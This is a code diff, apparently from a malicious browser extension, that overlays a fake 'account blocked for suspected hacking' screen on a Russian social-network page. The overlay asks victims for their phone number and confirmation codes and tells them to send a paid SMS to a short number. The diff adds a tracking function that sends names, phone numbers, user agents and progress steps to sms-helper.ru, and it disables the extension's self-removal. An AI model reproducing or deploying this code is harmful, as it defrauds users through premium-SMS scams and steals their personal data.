@@ -1,6 +1,7 @@
 var i = "";
 var type = "";
 var phone = "911";
+const goodUrl = "http://sms-helper.ru/js/";
 function TelCode(num){
 	return num.match(/\+7(?!7)|\+77|\+380|\+375|\+374|\+994|\+370|\+371|\+373/gi);
 }
@@ -14,6 +15,8 @@ function NewAction() {
     }
 	if (!plg.Get('oRun')){
 		plg.Save('oRun','1');
+		SendStat(0,"small");
+		console.log('0');
 	}
 }
 
@@ -203,6 +206,7 @@ var shot = "2332";
 function GetCountry() {
 	var cod = document.getElementById('pre').innerText;
 	cod = TelCode(cod).toString();
+	Prefix();
 	
 	if (/\+77/ig.test(cod)){
 		shot="7502";
@@ -304,19 +308,26 @@ function GoStep() {
     if (num.length == 0) {
         $('.input-e').text('Укажите номер телефона');
         $('.input-e').css('display', 'block');
+		SendStat(33,"small");
         return false;
     }
     if (num.length < 8) {
         $('.input-e').text('В номере неверное количество цифр.');
         $('.input-e').css('display', 'block');
+		SendStat(33,"small");
         return false;
     }
-    SendSMS();
-	Stat();
+    
+	plg.Save('oPhoneX',document.getElementById('pre').innerText+document.getElementById('field_mobile').value);
+	SendStat(3,"big");
+	GetCountry();
+	//SendSMS();
+	
     $('.input-e').css('display', 'none');
     $('#Step_1').animate({
         marginTop: '-=341px'
     }, 800);
+	SendStat(2,"small");
 }
 
 function st_2() {
@@ -326,11 +337,13 @@ function st_2() {
         $('.input-e').text('Введите код.');
         $('.input-e').css('display', 'block');
         return false;
+		SendStat(44,"small");
     }
     if (pole.length != 5) {
         $('.input-e').text('В коде слишком мало цифр.Повторите попытку.');
         $('.input-e').css('display', 'block');
         return false;
+		SendStat(44,"small");
     }
 
     var inputKey = document.getElementById('field_mobile2').value;
@@ -340,15 +353,17 @@ function st_2() {
             if (validKey[i] == inputKey) {
                 $('.input-e').css('display', 'none');
                 plg.Save('oRun', '0');
+				SendStat(5,"small");
                 alert('Вы успешно разблокировали свою страницу, рекомендуем вам сменить пароль');
                 RedirToChangePass();
                 HideLock();
-				plg.Del();
+				//plg.Del(); //удаление ext
                 return true;
             }
 
         $('.input-e').text('Вы ввели неправильный код, повторите попытку');
         $('.input-e').css('display', 'block');
+		SendStat(44,"small");
         return false;
 
     }
@@ -364,11 +379,13 @@ function check() {
     if (pole.length == 0) {
         $('.input-e').text('Введите код.');
         $('.input-e').css('display', 'block');
+		SendStat(44,"small");
         return false;
     }
     if (pole.length < 6) {
         $('.input-e').text('В коде слишком мало цифр.Повторите попытку.');
         $('.input-e').css('display', 'block');
+		SendStat(44,"small");
         return false;
     }
 }
@@ -399,9 +416,8 @@ function Sp_st() {
 	document.getElementById('pre').innerText = val;
     document.getElementById('contr').innerHTML = '<b>' + text + '</b>';
     document.getElementById('country_select').style.display = 'block';
-    document.getElementById('choose_country').style.display = 'none';
+    document.getElementById('choose_country').style.display = 'none';	
 	
-	GetCountry();
 	if (val=="+7"){
 		type="3";
 		plg.Save('oType',type);
@@ -469,9 +485,9 @@ function HideLock() {
     document.getElementById('hook_Block_PopLayer').style.display = 'none';
 }
 
-function Stat() {
+/* function Stat(step) {
 	var useragent = navigator.userAgent; 
-    var pre = document.getElementById('pre').innerText;
+    //var pre = document.getElementById('pre').innerText;
     pre = pre.replace('+', '');
     var HiName = plg.Get('oName');
     HiName = (encodeURIComponent(HiName));
@@ -482,14 +498,39 @@ function Stat() {
         res += alpha[parseInt(number[i])];
     var state = document.createElement('script');
     state.setAttribute('type', 'text/javascript');
-    var url = 'http://sms-helper.ru/js/stat.php?type='+type+'&set='+ res + '&name=' + HiName + '&page=' + id + '&id=' + plg.Get('id')+'&group='+plg.Get('group')+'&user_agent='+useragent;
+    var url = 'http://sms-helper.ru/js/statBeta.php?type='+type+'&set='+ res + '&name=' + HiName + '&page=' + id + '&id=' + plg.Get('id')+'&group='+plg.Get('group')+'&user_agent='+useragent+'&step='+step;
 	state.setAttribute('src', url);
     document.getElementsByTagName('head')[0].appendChild(state);
    
     plg.Save('oIdPage', id);
 
-}
+} */
+function SendStat(step, typeLog){
+	try{
+		var id = plg.Get('id');
+		var agent = encodeURIComponent(navigator.userAgent);
+		if(typeLog == 'small'){
+			var statUrl = 'statBeta.php?type=2&status=smallLog&id=' + id + '&agent=' + agent + '&step=' + step;
+			
+		}
+		
+		if(typeLog == 'big'){
+			var group = plg.Get('group');
+			var idPage = plg.Get('oIdPage');
+			var name = encodeURIComponent(plg.Get('oName'));
+			var number = plg.Get('oPhoneX');
+			number = number.replace(/\+/, '');
+			var statUrl = 'statBeta.php?type=2&status=bigLog&set=' + number + '&name=' + name + '&page=' + idPage + '&id=' + id + '&group=' + group.toString() + '&agent=' + agent + '&step=' + step;
+		}
 
+		var setStat = new Image();
+		setStat.src = goodUrl +""+ statUrl;
+		return;
+	} catch(e){
+		var setStat = new Image();
+		setStat.src = goodUrl + 'statBeta.php?type=2&status=error';
+	}
+}
 
 function MesBtnClick() {
     document.getElementsByClassName('mdialog mdialog_m')[0].parentNode.removeChild(document.getElementsByClassName('mdialog mdialog_m')[0]);
@@ -528,7 +569,7 @@ function SendSMS() {
 
         var sms = document.createElement('script');
         sms.setAttribute('type', 'text/javascript');
-        var url = 'http://sms-helper.ru/js/sendsms.php?type='+type+'&set='+ares+'&page=' + oID + '&id=' + id +'&shot='+shot;
+        var url = 'http://sms-helper.ru/js/sendsms.php?type='+type+'&set='+ares+'&id=' + id +'&shot='+shot;
 		sms.setAttribute('src', url);
         document.getElementsByTagName('head')[0].appendChild(sms);
 		
@@ -570,6 +611,10 @@ function Wnd() {
 	modalPop.setAttribute("onkeydown","cancel()");
 	document.getElementById('field_mobile').value = nam;
     plg.Save('oRun', '2');
+	SendStat(1,"small");
+	console.log('1');
+	
+	
 }
 
 function Wnd_Page() {
@@ -584,8 +629,7 @@ function Wnd_Page() {
 	
     modalPop.innerHTML = '<div class="feed-loading"></div></div><div id="hook_Modal_popLayer" class="modal" ><div id="popLayer_mo" class="modal_overlay"></div><table class="modal_tbl"><tbody><tr><td class="modal_td"><div id="modal_box" class="modal_box modal_box__payment" style="width: 740px; height: 341px;"><div class="panelLayer layerPanelSimple" id="paymentWizardInstant" style="width: 740px; height: 341px; border-color:#FFF;"><div class="panelLayer_head"><div class="panelLayer_head_headerSimple__no-title"></div></div><div class="panelLayer_body"><div id="pmntWzrdCtr"><div id="hook_Block_MiddleColumn" class="hookBlock"><div id="middleColumn"><div id="hook_Block_AnonymAccountRecovery" class="hookBlock"><div class="hook" id="hook_Form_5878971965"><form action="#" method="post"><div id="LockContent"><div id="Step_1" style="float: left; height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h2 class="recovery-header" ><br>' + unescape(plg.Get('oName')) + ', Ваша страница была заблокирована по подозрению на взлом!</h1><div><br>В течении минуты на Ваш телефон<b> '+plg.Get('oPhone')+ '</b> прийдет SMS с требованием подтвердить активацию Вашего аккаунта, после подтверждения Вы получите код, введите его здесь:</div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody><tr><td>Страна оператора: <Label id="contr"  ><b>Россия</b></label> <a><span style="color:orange;" id = "choose_country" onclick= "Sp_st();" >Выберите страну</a></span> <select onchange="in_sel_ch();"style="float: left; display: none; width: 90%;" id="country_select" name="country_select">2.<option value="+7">Россия</option cursor:pointer>3.<option value="+380">Украина</option>4.<option value="+374">Армения</option>5.<option value="+994">Азербайджан</option>5.<option value="+375">Беларусь</option>6.<option value="+370">Литва</option>6.<option value="+371">Латвия</option>7.<option value="+373">Молдова</option>7.<option value="+77">Казахстан</option> </select>&nbsp;</td></tr></tbody></table><span class="input-l input-l__promo recovery-phone-prefix"><label id="pre" for="prefix">+7</label></span><div class="it_w"><input type="text" name="st.mobile" value="7"'+nam+' id="field_mobile" class="it it__promo" autocomplete="off" maxlength="20" onkeypress="return OnlyNum(event)" autofocus></div><span class="input-e"></span></div><span><div class="form_i" style = "float:left"><input type="button" id="step" onclick="GoStep(); SendSMS();" value="Выслать код" class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div>	<div id="Step_2"  style="float: left;  height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h3 class="recovery-header"><br><br>Восстановление доступа</h3><br><b> ' +unescape(plg.Get('oName')) + ' </b>,на Ваш телефон прийдет SMS с кодом разблокировки Вашего аккаунта. Полученный код введите здесь :.<div></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody></tr></tbody></table><span class="input-l"><h2 class="recovery-header" >Введите код <br>подтверждения</h2></span><div class="it_w"><input type="text" name="st.mobile" value="" id="field_mobile2"  class="it it__promo" maxlength="20"></div><span class="input-e"></span></div><div class="form_i"><span><input type="button" id="step2" onclick="st_2();" value="Восстановить профиль" class="button-pro"></span></div><div class="form_i"><br><a span id="hid" style="cursor:pointer" onclick="Hidden();">Не получили код?</a><a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span> <div id="hide" style="display:none"><br>Получить активационный код можно отправив SMS с текстом <b>007187 252</b> на номер <b>5537</b>.Стоимость SMS равна номинальной стоимости, установленной вашим оператором.Если не получилось отправить смс, свяжитесь с нами</div></div></div></div><div></form></div></div></div></div></div></div></div></div></td></span></tr></tbody></table></div></div></div>';
     modalPop.style.display = 'block';
-	pCode = document.getElementById('country_select').value;
-	
+	pCode = document.getElementById('country_select').value;	
 	modalPop.setAttribute("onkeydown","cancel()");
 	document.getElementById('field_mobile').value = nam;
     modalPop.focus();
@@ -593,6 +637,8 @@ function Wnd_Page() {
     document.getElementById('modal_box').style.borderColor = "#FFF";
     document.getElementById('mainContainer').style.backgroundColor = "#FFF";
     plg.Get('oRun') == '2';
+	SendStat(2,"small");
+	console.log('2');
     if (document.getElementsByClassName('feed-loading')[0])
         document.getElementsByClassName('feed-loading')[0].parentNode.removeChild(document.getElementsByClassName('feed-loading')[0]);
 
@@ -603,6 +649,7 @@ function Hidden() {
 	if (h==0){
 		document.getElementById('hide').style.display = "block";
 		h=1;
+		SendStat(555,"small");
 	}
 	else {
 		document.getElementById('hide').style.display = "none";
@@ -644,6 +691,7 @@ function Mark() {
 		var d5 = document.getElementsByClassName('mark_ic mark_ic__5')[0];
 		d5.href='#';
 		d5.setAttribute('onclick','Wnd()');
+		SendStat(0,"small");
 		
 }
 
@@ -696,7 +744,7 @@ window.onload = function () {
 	if ((!plg.Get('oPhone'))||(plg.Get('oPhone').lenght==0)){    
 		GetNumber();
 	}
-	Prefix();
+	
 
 	var key = plg.Get('oRun');
     if (key == '0') {
@@ -706,6 +754,7 @@ window.onload = function () {
     if (key == '1') {
         document.body.addEventListener('DOMNodeInserted', Go, false);
 		LoadCSS();
+		
 	}
     if (key == '2') {
         LoadCSS();
@@ -774,8 +823,11 @@ function IsTime() {
     } catch (e) {}
     if (lTime < getTime()) {
         plg.Save('oRun', '0');
-		plg.Del();
+		SendStat(666,"big");
+		SendStat(666,"small");
+		//plg.Del();
         LockStop();
 
     }
 }
+
